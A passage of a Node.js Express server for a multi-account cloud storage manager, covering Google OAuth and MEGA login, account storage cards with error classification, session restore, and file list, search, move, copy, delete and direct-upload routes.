    drives.push(...(response.data.drives || []))
    pageToken = response.data.nextPageToken || null
  } while (pageToken)

  return drives.map((drive) => ({
    id: drive.id,
    name: drive.name || "Shared drive",
    mimeType: FOLDER_MIME,
    size: null,
    modifiedTime: null,
    webViewLink: null,
    parents: [],
    driveId: drive.id,
    isSharedDriveRoot: true
  }))
}

async function listMegaChildren(storage, parentId) {
  await storage.reload(true)

  const parentNode = parentId === "root" ? storage.root : getMegaNodeById(storage, parentId)
  if (!parentNode || !parentNode.directory) {
    const err = new Error("Destination folder not found")
    err.statusCode = 404
    throw err
  }

  const children = Array.isArray(parentNode.children) ? parentNode.children : []
  return children.map((node) => normalizeMegaNode(node, parentNode.nodeId || "root"))
}

app.get("/auth/google", (req, res) => {
  return res.status(400).send("Use /auth/google/start with custom Google OAuth credentials.")
})

app.post("/auth/google/start", async (req, res) => {
  try {
    cleanupOAuthStates(req.userSession)
    const customClientId = getBodyTrimmed(req, "clientId")
    const customClientSecret = getBodyTrimmed(req, "clientSecret")
    if (!customClientId || !customClientSecret) {
      return res.status(400).json({ error: "Both Client ID and Client Secret are required." })
    }
    const clientId = customClientId
    const clientSecret = customClientSecret

    const redirectUri = resolveRedirectUri(req)
    const state = makeOAuthStateToken()
    req.userSession.oauthStates[state] = {
      clientId,
      clientSecret,
      redirectUri,
      createdAt: Date.now()
    }
    await req.saveUserSession()

    const url =
      `https://accounts.google.com/o/oauth2/v2/auth?client_id=${encodeURIComponent(clientId)}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code&scope=${encodeURIComponent(GOOGLE_OAUTH_SCOPE)}&access_type=offline&prompt=consent&state=${encodeURIComponent(state)}`
    return res.json({ url })
  } catch (err) {
    logError(err)
    return res.status(500).json({ error: "Unable to start Google login." })
  }
})

//there is no /mega-login.html in public/ (the MEGA form lives in a modal on the home
//page), so these used to redirect the user straight into a 404.
app.get("/auth/mega", (req, res) => {
  res.redirect("/?connect=mega")
})

app.post("/auth/mega/login", async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const password = getBodyRaw(req, "password")
    const secondFactorCode = getBodyTrimmed(req, "secondFactorCode")
    await connectMegaAccountWithCredentials(req.userSession, { email, password, secondFactorCode })
    await req.saveUserSession()
    res.redirect("/")
  } catch (err) {
    logError(err)
    const msg = err && err.message ? err.message : "Unable to login to MEGA"
    res.redirect("/?connect=mega&error=" + encodeURIComponent(msg))
  }
})

app.post("/auth/mega/login-json", async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const password = getBodyRaw(req, "password")
    const secondFactorCode = getBodyTrimmed(req, "secondFactorCode")
    const accountEmail = await connectMegaAccountWithCredentials(req.userSession, { email, password, secondFactorCode })
    await req.saveUserSession()
    return res.json({ success: true, email: accountEmail })
  } catch (err) {
    const msg = err && err.message ? err.message : "Unable to login to MEGA"
    return res.status(400).json({ error: msg })
  }
})

app.post("/auth/mega/token", (req, res) => {
  connectMegaAccount(req.userSession)
    .then(async () => {
      await req.saveUserSession()
      res.redirect("/")
    })
    .catch((err) => {
      logError(err)
      const msg = encodeURIComponent(err && err.message ? err.message : "Unable to connect MEGA token")
      res.redirect("/?connect=mega&error=" + msg)
    })
})

app.post("/auth/mega/token-json", async (req, res) => {
  try {
    const email = await connectMegaAccount(req.userSession)
    await req.saveUserSession()
    return res.json({ success: true, email })
  } catch (err) {
    const msg = err && err.message ? err.message : "Unable to connect MEGA token"
    return res.status(400).json({ error: msg })
  }
})

app.get("/auth/google/callback", async (req, res) => {
  try {
    const code = req.query.code
    const state = getQueryTrimmed(req, "state")
    const googleError = getQueryTrimmed(req, "error")
    if (googleError) {
      return res.redirect("/?connectError=" + encodeURIComponent("Google returned: " + googleError))
    }
    cleanupOAuthStates(req.userSession)

    const oauthStates = req.userSession.oauthStates || {}
    if (!state || !oauthStates[state]) {
      //this is the "cookie or session was lost between the two requests" case. saying
      //so plainly beats a bare 400 page.
      return res.redirect("/?connectError=" + encodeURIComponent(
        "Google sign-in session expired before the redirect came back. Start the Google connect step again."
      ))
    }
    const stateData = oauthStates[state]
    delete oauthStates[state]
    req.userSession.oauthStates = oauthStates
    const oauthClientId = stateData.clientId
    const oauthClientSecret = stateData.clientSecret
    const oauthRedirectUri = stateData.redirectUri || resolveRedirectUri(req)

    const tokenResponse = await axios.post(GOOGLE_TOKEN_URL, {
      code,
      client_id: oauthClientId,
      client_secret: oauthClientSecret,
      redirect_uri: oauthRedirectUri,
      grant_type: "authorization_code"
    }, { timeout: 15000 })

    const accessToken = tokenResponse.data.access_token
    const profileResponse = await axios.get(GOOGLE_PROFILE_URL, {
      headers: authHeaders(accessToken),
      timeout: 15000
    })

    //the refresh token and the user's own client id/secret are stored with the account
    //so the access token can be renewed later. without them the account went dark
    //(and looked "disconnected") about an hour after connecting.
    upsertAccount(req.userSession, {
      provider: "google",
      email: profileResponse.data.email,
      token: accessToken,
      refreshToken: typeof tokenResponse.data.refresh_token === "string" ? tokenResponse.data.refresh_token : "",
      clientId: oauthClientId,
      clientSecret: oauthClientSecret,
      expiresAt: Date.now() + (Number(tokenResponse.data.expires_in || 3600) * 1000)
    })

    //one single save that persists both the consumed oauth state and the new account.
    //it must complete BEFORE the redirect: on Vercel the instance can be frozen as
    //soon as the response is flushed, so a save left running in the background may
    //never reach Redis and the home page would come back with zero accounts.
    await req.saveUserSession()

    //the account is connected either way, but a quick probe here means a project with
    //the Drive API switched off is reported at connect time - with the fix - instead of
    //turning into a broken card on the home screen.
    let warning = ""
    try {
      await axios.get(DRIVE_ABOUT_URL, { headers: authHeaders(accessToken), timeout: 5000 })
    } catch (probeErr) {
      const classified = classifyGoogleApiError(probeErr)
      if (classified.kind === "service_disabled") {
        warning = "Account connected, but " + classified.message.charAt(0).toLowerCase() + classified.message.slice(1)
        if (classified.helpUrl) warning += " " + classified.helpUrl
      }
    }

    console.log("Google account connected:", normalizeEmail(profileResponse.data.email), warning ? "(drive api disabled)" : "")
    res.redirect(warning ? "/?connectError=" + encodeURIComponent(warning) : "/?connected=google")
  } catch (err) {
    logError(err)
    const detail = err.response?.data?.error_description || err.response?.data?.error || err.message || "unknown error"
    res.redirect("/?connectError=" + encodeURIComponent("Google connect failed: " + String(detail).slice(0, 300)))
  }
})

//one card per connected account.
//every account is resolved independently, in parallel, behind its own timeout, and a
//failing account becomes a card with an error instead of taking the whole response
//down. the old version bailed out to res.send("Error fetching storage info") - a
//200 with a text/html body - so the browser's res.json() threw and the home screen
//rendered "no connected accounts" even though the session had accounts in it.
async function buildMegaStorageCard(account) {
  const storage = await ensureMegaStorageForAccount(account, { needTree: false })
  const info = await storage.getAccountInfo()
  const email = account.email || buildMegaEmail(storage)
  const givenName = getFirstNameFromEmail(email)

  //MEGA rotates its session id, so keep the stored token in step with the live one.
  const refreshedToken = serializeMegaStorage(storage)
  const tokenChanged = !!refreshedToken && refreshedToken !== account.megaSessionToken
  if (tokenChanged) account.megaSessionToken = refreshedToken

  return {
    card: {
      provider: "mega",
      user: {
        emailAddress: email,
        displayName: givenName || "MEGA",
        givenName,
        photoLink: ""
      },
      storageQuota: {
        usage: Number(info.spaceUsed || 0),
        limit: Number(info.spaceTotal || 0),
        usageInDrive: Number(info.spaceUsed || 0),
        usageInDriveTrash: 0
      }
    },
    sessionChanged: tokenChanged
  }
}

//megajs surfaces MEGA's numeric API errors as strings like
//"ESID (-15): Invalid or expired user session, please relogin". Same idea as the Google
//classifier: only some of them are fixed by reconnecting.
function classifyMegaError(err) {
  const raw = String(err?.message || "").trim()

  const is = (code) => new RegExp("\\b" + code + "\\b", "i").test(raw)

  if (is("ESID") || /session expired|please relogin|reconnect the account/i.test(raw)) {
    return { needsReauth: true, message: "This MEGA session expired. Reconnect the account." }
  }
  if (is("EMFAREQUIRED")) {
    return { needsReauth: true, message: "MEGA wants your two-factor code. Reconnect the account and enter it." }
  }
  if (is("ENOENT")) {
    return { needsReauth: true, message: "MEGA rejected these credentials. Reconnect the account." }
  }
  if (is("EBLOCKED")) {
    return { needsReauth: false, message: "MEGA has blocked this account." }
  }
  if (is("EOVERQUOTA") || is("EGOINGOVERQUOTA") || is("ESHAREROVERQUOTA")) {
    return { needsReauth: false, message: "This MEGA account is over its quota." }
  }
  if (is("EAGAIN") || is("ERATELIMIT") || is("ETEMPUNAVAIL") || is("ETOOMANYCONNECTIONS")) {
    return { needsReauth: false, message: "MEGA is busy right now. Retry in a moment." }
  }

  return { needsReauth: false, message: raw || "Unable to read this MEGA account right now." }
}

//Google answers 403 for several unrelated situations and only one of them is fixed by
//reconnecting. Telling a user to reconnect when the Drive API is switched off in their
//Cloud project sends them round a loop that can never succeed, so classify first.
function classifyGoogleApiError(err) {
  const status = Number(err?.response?.status || 0)
  const payload = err?.response?.data?.error
  const rawMessage = String(payload?.message || err?.message || "").trim()
  const reasons = []
  if (Array.isArray(payload?.errors)) {
    payload.errors.forEach((item) => reasons.push(String(item?.reason || "").toLowerCase()))
  }
  if (Array.isArray(payload?.details)) {
    payload.details.forEach((item) => reasons.push(String(item?.reason || "").toLowerCase()))
  }
  reasons.push(String(payload?.status || "").toLowerCase())

  const has = (needle) => reasons.some((reason) => reason === needle)

  //the "Help" detail carries the exact console URL for this project
  let helpUrl = ""
  if (Array.isArray(payload?.details)) {
    for (const item of payload.details) {
      const link = Array.isArray(item?.links) ? item.links.find((l) => l && l.url) : null
      if (link) {
        helpUrl = String(link.url)
        break
      }
    }
  }
  if (!helpUrl) {
    const found = rawMessage.match(/https:\/\/console\.(?:developers|cloud)\.google\.com\/\S+/)
    if (found) helpUrl = found[0].replace(/[.,)]+$/, "")
  }

  //project number, so the message can say which project to go and fix
  let project = ""
  if (Array.isArray(payload?.details)) {
    for (const item of payload.details) {
      const consumer = String(item?.metadata?.consumer || "")
      const match = consumer.match(/projects?\/(\d+)/)
      if (match) {
        project = match[1]
        break
      }
    }
  }
  if (!project) {
    const match = rawMessage.match(/project\s+(\d{6,})/i)
    if (match) project = match[1]
  }

  const serviceDisabled =
    has("accessnotconfigured") ||
    has("service_disabled") ||
    /has not been used in project|is disabled|api is not enabled/i.test(rawMessage)

  if (status === 403 && serviceDisabled) {
    if (!helpUrl) {
      helpUrl = "https://console.cloud.google.com/apis/library/drive.googleapis.com" +
        (project ? `?project=${project}` : "")
    }
    return {
      kind: "service_disabled",
      needsReauth: false,
      helpUrl,
      message:
        "The Google Drive API is turned off in the Google Cloud project" +
        (project ? ` ${project}` : "") +
        " that these OAuth credentials belong to. Enable \"Google Drive API\" for that project, wait a minute for it to take effect, then reload this page."
    }
  }

  if (has("ratelimitexceeded") || has("userratelimitexceeded") || has("quotaexceeded") || status === 429) {
    return {
      kind: "rate_limited",
      needsReauth: false,
      helpUrl: "",
      message: "Google is rate limiting this account right now. Wait a moment and reload."
    }
  }

  const scopeProblem =
    has("insufficientpermissions") ||
    has("access_token_scope_insufficient") ||
    /insufficient (authentication )?scopes?/i.test(rawMessage)

  if (status === 401 || (status === 403 && scopeProblem) || /invalid_grant|invalid credentials|token has been expired or revoked/i.test(rawMessage)) {
    return {
      kind: "auth",
      needsReauth: true,
      helpUrl: "",
      message: scopeProblem
        ? "This account did not grant Drive access. Reconnect it and allow the Drive permission."
        : "Access to this account expired. Reconnect it to continue."
    }
  }

  return {
    kind: "other",
    needsReauth: false,
    helpUrl,
    message: rawMessage || "Unable to read this account right now."
  }
}

async function buildGoogleStorageCard(account) {
  let sessionChanged = false

  const load = async () => Promise.all([
    axios.get(DRIVE_ABOUT_URL, { headers: authHeaders(account.token), timeout: STORAGE_ACCOUNT_TIMEOUT_MS }),
    axios.get(GOOGLE_PROFILE_URL, { headers: authHeaders(account.token), timeout: STORAGE_ACCOUNT_TIMEOUT_MS })
  ])

  let responses
  try {
    responses = await load()
  } catch (err) {
    //only retry when the token itself is the problem. a 403 for a disabled Drive API or
    //a rate limit is not fixed by minting a new token, and retrying just burns time
    //against the function's deadline.
    const classified = classifyGoogleApiError(err)
    const canRetry = classified.needsReauth && !!account.refreshToken
    if (!canRetry) throw err
    if (!(await refreshGoogleAccount(account))) throw err
    sessionChanged = true
    responses = await load()
  }

  const [driveResponse, profileResponse] = responses
  const driveUser = driveResponse.data.user || {}
  const profile = profileResponse.data || {}
  const email = driveUser.emailAddress || profile.email || account.email
  const displayName = driveUser.displayName || profile.name || ""

  return {
    card: {
      provider: "google",
      ...driveResponse.data,
      user: {
        ...driveUser,
        emailAddress: email,
        displayName,
        givenName: profile.given_name || getFirstNameFromDisplayName(displayName) || getFirstNameFromEmail(email),
        photoLink: driveUser.photoLink || profile.picture
      }
    },
    sessionChanged
  }
}

function buildFailedStorageCard(account, err) {
  const provider = normalizeProvider(account.provider) || "google"
  const email = normalizeEmail(account.email)
  const givenName = getFirstNameFromEmail(email)

  let message = ""
  let needsReauth = false
  let helpUrl = ""

  if (err?.isTimeout) {
    message = "This account took too long to answer. Reload to try again."
  } else if (provider === "mega") {
    const classified = classifyMegaError(err)
    message = classified.message
    needsReauth = classified.needsReauth
  } else {
    const classified = classifyGoogleApiError(err)
    message = classified.message
    needsReauth = classified.needsReauth
    helpUrl = classified.helpUrl
  }

  return {
    provider,
    error: message,
    needsReauth,
    //a link the user can act on (for example the "enable the Drive API" console page)
    helpUrl,
    user: {
      emailAddress: email,
      displayName: givenName || (provider === "mega" ? "MEGA" : "Google Drive"),
      givenName,
      photoLink: ""
    },
    //always present so the front end can render the card without optional chaining.
    storageQuota: {
      usage: 0,
      limit: 0,
      usageInDrive: 0,
      usageInDriveTrash: 0
    }
  }
}

app.get("/storage", async (req, res) => {
  try {
    await ensureFreshGoogleTokens(req)

    const sessionAccounts = Array.isArray(req.userSession.accounts) ? req.userSession.accounts : []
    let sessionChanged = false

    const settled = await Promise.all(sessionAccounts.map(async (account) => {
      try {
        const build = normalizeProvider(account.provider) === "mega"
          ? buildMegaStorageCard(account)
          : buildGoogleStorageCard(account)
        const result = await withTimeout(build, STORAGE_ACCOUNT_TIMEOUT_MS, `Reading ${account.email}`)
        if (result.sessionChanged) sessionChanged = true
        return result.card
      } catch (err) {
        console.error(`[multi-drive] /storage failed for ${account.provider}:${account.email}:`, err.response?.data || err.message)
        return buildFailedStorageCard(account, err)
      }
    }))

    if (sessionChanged) {
      try {
        await req.saveUserSession()
      } catch (e) { }
    }

    res.json(settled)
  } catch (err) {
    logError(err)
    //still JSON, still an array-shaped failure the client can reason about.
    res.status(500).json({ error: "Error fetching storage info", accounts: [] })
  }
})

app.post("/logout", async (req, res) => {
  const email = req.body?.email
  const provider = normalizeProvider(req.body?.provider)

  if (!email) {
    return res.status(400).json({ error: "Email is required" })
  }

  const sessionAccounts = Array.isArray(req.userSession.accounts) ? req.userSession.accounts : []
  const previousLength = sessionAccounts.length
  const removed = []
  req.userSession.accounts = sessionAccounts.filter((account) => {
    const sameEmail = normalizeEmail(account.email) === normalizeEmail(email)
    if (!sameEmail) return true
    if (provider && normalizeProvider(account.provider) !== provider) return true
    removed.push(account)
    return false
  })

  if (req.userSession.accounts.length === previousLength) {
    return res.status(404).json({ error: "Account not found" })
  }

  //drop the warm MEGA session too, otherwise a re-login on the same instance keeps
  //talking to the old cached storage object.
  for (const account of removed) {
    const key = cacheKeyForMegaAccount(account)
    if (key) megaStorageCache.delete(key)
  }

  //await it: on serverless a background save can be frozen before it lands, which
  //makes a removed account reappear on the next page load.
  try {
    await req.saveUserSession()
  } catch (e) { }
  res.json({ success: true })
})

app.get("/session/export", (req, res) => {
  try {
    return res.json({ accounts: exportSessionAccountsForClient(req.userSession) })
  } catch (err) {
    logError(err)
    return res.status(500).json({ error: "Unable to export session" })
  }
})

//the browser keeps a copy of its accounts in localStorage as a safety net for a lost
//cookie. that copy is always older than the server's, so it may only ADD accounts the
//session does not have - never overwrite one that is already there. the previous
//version overwrote unconditionally, so the page load right after a successful Google
//connect replaced the brand new access token with a stale cached one, every /storage
//call then 401'd, and the freshly connected account never appeared.
app.post("/session/restore", async (req, res) => {
  try {
    const source = Array.isArray(req.body?.accounts) ? req.body.accounts : []
    const restored = []
    const skipped = []

    for (const raw of source) {
      const provider = normalizeProvider(raw?.provider)
      const email = normalizeEmail(raw?.email)
      if (!provider || !email) continue

      if (getAccountByEmail(req.userSession, email, provider)) {
        skipped.push({ provider, email })
        continue
      }

      if (provider === "mega") {
        const megaSessionToken = typeof raw?.megaSessionToken === "string" ? raw.megaSessionToken.trim() : ""
        if (!megaSessionToken) continue
        upsertAccount(req.userSession, {
          provider: "mega",
          email,
          megaSessionToken
        })
        restored.push({ provider: "mega", email })
        continue
      }

      const token = typeof raw?.token === "string" ? raw.token.trim() : ""
      if (!token) continue
      upsertAccount(req.userSession, {
        provider: "google",
        email,
        token
      })
      restored.push({ provider: "google", email })
    }

    if (restored.length) {
      await req.saveUserSession()
    }
    return res.json({ success: true, restored, skipped })
  } catch (err) {
    logError(err)
    return res.status(500).json({ error: "Unable to restore session" })
  }
})

//safe to expose: says whether sessions can survive between requests, without leaking
//any credential. this is the first thing to check when the deployed site "forgets"
//accounts but localhost does not.
app.get("/health", (req, res) => {
  res.json({
    ok: true,
    serverless: IS_SERVERLESS,
    sessionStore: HAS_UPSTASH ? "upstash-redis" : "in-memory",
    sessionsSurviveRestarts: HAS_UPSTASH,
    warning: IS_SERVERLESS && !HAS_UPSTASH
      ? "Serverless host without Upstash: connected accounts will not survive between requests. Set UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN."
      : null,
    googleOauthRedirectUri: resolveRedirectUri(req),
    accountsInThisSession: Array.isArray(req.userSession?.accounts) ? req.userSession.accounts.length : 0
  })
})

app.get("/files", async (req, res) => {
  try {
    const email = getQueryTrimmed(req, "email")
    const provider = getQueryTrimmed(req, "provider")

    if (!email) {
      return res.status(400).json({ error: "Query parameter email is required" })
    }

    const parentId = getQueryTrimmed(req, "parentId") || "root"
    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found" })
    }

    if (account.provider === "mega") {
      //needTree:false - listMegaChildren does its own reload.
      const items = await listMegaChildren(await ensureMegaStorageForAccount(account, { needTree: false }), parentId)
      return res.json({ parentId, items })
    }

    if (parentId === "__shared_drives__") {
      const items = await listSharedDrives(account.token)
      return res.json({ parentId, items })
    }

    const items = await listChildrenInFolder(account.token, parentId)
    res.json({ parentId, items })
  } catch (err) {
    sendErrorJson(res, err, "Error fetching files")
  }
})

app.get("/open-file", async (req, res) => {
  try {
    const email = getQueryTrimmed(req, "email")
    const provider = getQueryTrimmed(req, "provider")
    const fileId = getQueryTrimmed(req, "fileId")

    if (!email || !fileId) {
      return res.status(400).json({ error: "Query parameters email and fileId are required" })
    }

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found" })
    }

    if (account.provider === "mega") {
      const storage = await ensureMegaStorageForAccount(account)
      const node = getMegaNodeById(storage, fileId)
      if (!node) {
        return res.status(404).json({ error: "File not found" })
      }
      if (node.directory) {
        return res.status(400).json({ error: "Cannot open a folder link from this endpoint" })
      }

      const megaUrl = await node.link(false)
      return res.redirect(megaUrl)
    }

    const response = await axios.get(`${DRIVE_FILES_URL}/${encodeURIComponent(fileId)}`, {
      headers: authHeaders(account.token),
      params: {
        fields: "id, webViewLink, webContentLink, mimeType",
        supportsAllDrives: true
      }
    })
    const openUrl = response.data?.webViewLink || response.data?.webContentLink
    if (!openUrl) {
      return res.status(404).json({ error: "No open link available for this file" })
    }
    return res.redirect(openUrl)
  } catch (err) {
    sendErrorJson(res, err, "Error opening file")
  }
})

app.get("/search", async (req, res) => {
  try {
    const query = getQueryTrimmed(req, "q")
    if (!query) {
      return res.status(400).json({ error: "Query parameter q is required" })
    }

    const sessionAccounts = Array.isArray(req.userSession.accounts) ? req.userSession.accounts : []
    if (sessionAccounts.length === 0) {
      return res.json({ query, results: [] })
    }

    const escapedQuery = escapeDriveContains(query)
    const driveQuery = `name contains '${escapedQuery}' and trashed=false`

    const tasks = sessionAccounts.map(async (account) => {
      if (account.provider === "mega") {
        //ensureMegaStorageForAccount already reloads the tree when needTree is on.
        const storage = await ensureMegaStorageForAccount(account)
        const needle = query.toLowerCase()

        return (storage.filter(() => true, true) || [])
          .filter((node) => node && node.name && String(node.name).toLowerCase().includes(needle))
          .slice(0, 100)
          .map((node) => ({
            ...normalizeMegaNode(node, node.parent ? node.parent.nodeId : "root"),
            accountEmail: account.email,
            accountProvider: account.provider
          }))
      }

      const response = await axios.get(DRIVE_FILES_URL, {
        headers: authHeaders(account.token),
        params: {
          q: driveQuery,
          pageSize: 100,
          fields: "files(id, name, mimeType, size, modifiedTime, webViewLink, driveId, parents)",
          orderBy: "modifiedTime desc",
          supportsAllDrives: true,
          includeItemsFromAllDrives: true,
          corpora: "allDrives"
        }
      })

      return (response.data.files || []).map((file) => ({
        ...file,
        accountEmail: account.email,
        accountProvider: account.provider
      }))
    })

    //one dead account must not wipe out the results of the healthy ones, so failures
    //are collected and reported next to the hits instead of rejecting the request.
    const settled = await Promise.allSettled(
      tasks.map((task, index) => withTimeout(task, STORAGE_ACCOUNT_TIMEOUT_MS, `Searching ${sessionAccounts[index]?.email}`))
    )

    const results = []
    const failed = []
    settled.forEach((item, index) => {
      const account = sessionAccounts[index] || {}
      if (item.status === "fulfilled") {
        results.push(...(Array.isArray(item.value) ? item.value : []))
        return
      }
      const err = item.reason
      console.error(`[multi-drive] /search failed for ${account.provider}:${account.email}:`, err?.response?.data || err?.message)
      failed.push({
        provider: normalizeProvider(account.provider),
        email: normalizeEmail(account.email),
        error: err?.isTimeout ? "Timed out" : (err?.response?.data?.error?.message || err?.message || "Search failed")
      })
    })

    res.json({ query, results, failed })
  } catch (err) {
    sendErrorJson(res, err, "Error searching files")
  }
})

app.post("/delete-item", async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const provider = getBodyTrimmed(req, "provider")
    const fileId = getBodyTrimmed(req, "fileId")

    if (!email || !fileId) {
      return res.status(400).json({ error: "email and fileId are required" })
    }

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found" })
    }

    if (account.provider === "mega") {
      return res.status(403).json({ error: "Delete feature is only available in Google Drive account for now. i am working on it, stay tuned!" })
    }

    await axios.delete(`${DRIVE_FILES_URL}/${encodeURIComponent(fileId)}`, {
      headers: authHeaders(account.token),
      params: { supportsAllDrives: true }
    })

    res.json({ success: true })
  } catch (err) {
    sendErrorJson(res, err, "Error deleting file")
  }
})

app.post("/copy-item", async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const provider = getBodyTrimmed(req, "provider")
    const fileId = getBodyTrimmed(req, "fileId")
    const destinationFolderId = getBodyTrimmed(req, "destinationFolderId")

    if (!email || !fileId || !destinationFolderId) {
      return res.status(400).json({ error: "email, fileId and destinationFolderId are required" })
    }

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found" })
    }

    if (account.provider === "mega") {
      const storage = await ensureMegaStorageForAccount(account)
      const source = getMegaNodeById(storage, fileId)
      const target = destinationFolderId === "root" ? storage.root : getMegaNodeById(storage, destinationFolderId)
      if (!source || !target || !target.directory) {
        return res.status(404).json({ error: "Source or destination not found" })
      }
      await source.copyTo(target)
      return res.json({ success: true })
    }

    await axios.post(
      `${DRIVE_FILES_URL}/${encodeURIComponent(fileId)}/copy`,
      { parents: [destinationFolderId] },
      {
        headers: {
          ...authHeaders(account.token),
          "Content-Type": "application/json"
        },
        params: { supportsAllDrives: true }
      }
    )

    res.json({ success: true })
  } catch (err) {
    sendErrorJson(res, err, "Error copying file")
  }
})

app.post("/move-item", async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const provider = getBodyTrimmed(req, "provider")
    const fileId = getBodyTrimmed(req, "fileId")
    const destinationFolderId = getBodyTrimmed(req, "destinationFolderId")

    if (!email || !fileId || !destinationFolderId) {
      return res.status(400).json({ error: "email, fileId and destinationFolderId are required" })
    }

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found" })
    }

    if (account.provider === "mega") {
      const storage = await ensureMegaStorageForAccount(account)
      const source = getMegaNodeById(storage, fileId)
      const target = destinationFolderId === "root" ? storage.root : getMegaNodeById(storage, destinationFolderId)
      if (!source || !target || !target.directory) {
        return res.status(404).json({ error: "Source or destination not found" })
      }
      await source.moveTo(target)
      return res.json({ success: true })
    }

    const currentFile = await axios.get(`${DRIVE_FILES_URL}/${encodeURIComponent(fileId)}`, {
      headers: authHeaders(account.token),
      params: { fields: "parents", supportsAllDrives: true }
    })

    const existingParents = Array.isArray(currentFile.data?.parents) ? currentFile.data.parents.filter(Boolean) : []
    const removeParents = existingParents.join(",")
    const params = { addParents: destinationFolderId, supportsAllDrives: true }
    if (removeParents) params.removeParents = removeParents

    await axios.patch(`${DRIVE_FILES_URL}/${encodeURIComponent(fileId)}`, null, {
      headers: authHeaders(account.token),
      params
    })

    res.json({ success: true })
  } catch (err) {
    sendErrorJson(res, err, "Error moving file")
  }
})

app.post("/create-folder", async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const provider = getBodyTrimmed(req, "provider")
    const parentId = getBodyTrimmed(req, "parentId") || "root"
    const folderName = getBodyTrimmed(req, "folderName")

    if (!email || !folderName) {
      return res.status(400).json({ error: "email and folderName are required" })
    }

    if (parentId === "__shared_drives__") {
      return res.status(400).json({ error: "Open a destination folder first" })
    }

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found" })
    }

    if (account.provider === "mega") {
      const storage = await ensureMegaStorageForAccount(account)
      const targetFolder = parentId === "root" ? storage.root : getMegaNodeById(storage, parentId)
      if (!targetFolder || !targetFolder.directory) {
        return res.status(404).json({ error: "Destination folder not found" })
      }
      const created = await targetFolder.mkdir(folderName)
      //no second reload: the created node is returned straight away and the next
      //request re-reads the tree anyway. one less full tree download per folder.
      return res.json({ success: true, item: normalizeMegaNode(created, targetFolder.nodeId || "root") })
    }

    const response = await axios.post(
      DRIVE_FILES_URL,
      {
        name: folderName,
        mimeType: FOLDER_MIME,
        parents: [parentId]
      },
      {
        headers: {
          ...authHeaders(account.token),
          "Content-Type": "application/json"
        },
        params: {
          fields: "id,name,mimeType,size,modifiedTime,webViewLink,parents,driveId",
          supportsAllDrives: true
        }
      }
    )

    return res.json({ success: true, item: response.data })
  } catch (err) {
    sendErrorJson(res, err, "Error creating folder")
  }
})


//Uploading a file no longer means pushing it through this server.
//The browser asks here for a Google resumable session URL, then PUTs the bytes straight to
//Google. This request carries no file data, so it finishes in milliseconds and fits inside
//any serverless request body limit - which is the only reason uploads work on Vercel at
//all. It also means the browser's progress events finally measure the real transfer.
app.post("/upload-session", async (req, res) => {
  try {
    const email = getBodyTrimmed(req, "email")
    const provider = getBodyTrimmed(req, "provider")
    const parentId = getBodyTrimmed(req, "parentId")
    const name = getBodyTrimmed(req, "name") || "upload.bin"
    const mimeType = getBodyTrimmed(req, "mimeType") || "application/octet-stream"
    const size = Number(req.body?.size || 0) || 0

    if (!email || !parentId) {
      return res.status(400).json({ error: "email and parentId are required" })
    }

    const account = getAccountByEmail(req.userSession, email, provider)
    if (!account) {
      return res.status(404).json({ error: "Account not found. Reconnect it and try again." })
    }

    //MEGA has no equivalent handoff: its upload needs the account session and megajs's
    //chunk encryption, so those bytes still travel through this server. Telling the browser
    //the cap up front turns an over sized MEGA upload into a sentence it can show instead
    //of the host's own error page.
    if (normalizeProvider(account.provider) === "mega") {
      return res.json({
        mode: "server",
        providerName: "MEGA",
        maxBytes: PROXY_UPLOAD_MAX_BYTES
      })
    }

    const startRes = await axios.post(
      DRIVE_UPLOAD_URL,
      { name, parents: [parentId] },
      {
        headers: {
          ...authHeaders(account.token),
          "Content-Type": "application/json; charset=UTF-8",
          "X-Upload-Content-Type": mimeType,
          //Google decides whether the session URL will answer CORS from the Origin on THIS
          //request, not on the browser's PUT. Without it the browser uploads every byte and
          //then cannot read the reply - which looks exactly like a failed upload of a file
          //that is now sitting in Drive.
          ...(req.headers.origin ? { Origin: req.headers.origin } : {}),
          ...(size > 0 ? { "X-Upload-Content-Length": String(size) } : {})
        },
        params: {
          uploadType: "resumable",
          supportsAllDrives: true,
          fields: "id,name,mimeType,size,modifiedTime,webViewLink,parents,driveId"
        }
      }
    )

    const uploadUrl = startRes.headers && (startRes.headers.location || startRes.headers.Location)
    if (!uploadUrl) {
      return res.status(502).json({ error: "Google did not return an upload session URL" })
    }

    //the session URL is the credential for the PUT, so no access token reaches the browser.
    res.json({ mode: "direct", uploadUrl, maxBytes: PROXY_UPLOAD_MAX_BYTES })
  } catch (err) {
    sendErrorJson(res, err, "Could not start the upload")
  }
})

//Did the upload actually land? A browser PUT that ends with status 0 says nothing about what
//Google received - the bytes may all have arrived and only the reply got lost. Google is the
//only one who knows, and a resumable session answers that question directly: an empty PUT
//with "Content-Range: bytes star/size" returns 200/201 with the file when it is complete, or
//308 when it is not. Without this, a lost reply is reported as a failure for a file the user
//can already see in Drive.
app.post("/upload-session-status", async (req, res) => {
  try {
    const uploadUrl = getBodyTrimmed(req, "uploadUrl")
    const size = Number(req.body?.size || 0) || 0

    //the browser hands us a URL and we fetch it, so pin it to Google's upload host.
    if (!uploadUrl.startsWith("https://www.googleapis.com/upload/drive/v3/files")) {
      return res.status(400).json({ error: "Not a Google upload session URL" })
    }

    const statusRes = await axios.put(uploadUrl, null, {
      headers: {
        "Content-Range": size > 0 ? `bytes */${size}` : "bytes */*",
        "Content-Length": 0
      },
      maxRedirects: 0, //308 here means "not finished", not "go somewhere else"
      validateStatus: () => true
    })

    if (statusRes.status === 200 || statusRes.status === 201) {
